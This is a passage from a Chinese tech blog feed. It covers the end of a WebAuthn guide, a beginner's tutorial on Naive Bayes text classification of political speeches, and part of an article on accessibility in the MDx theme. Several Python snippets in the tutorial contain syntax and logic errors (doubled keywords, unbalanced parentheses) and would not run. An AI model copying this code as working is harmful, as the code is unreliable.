alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" 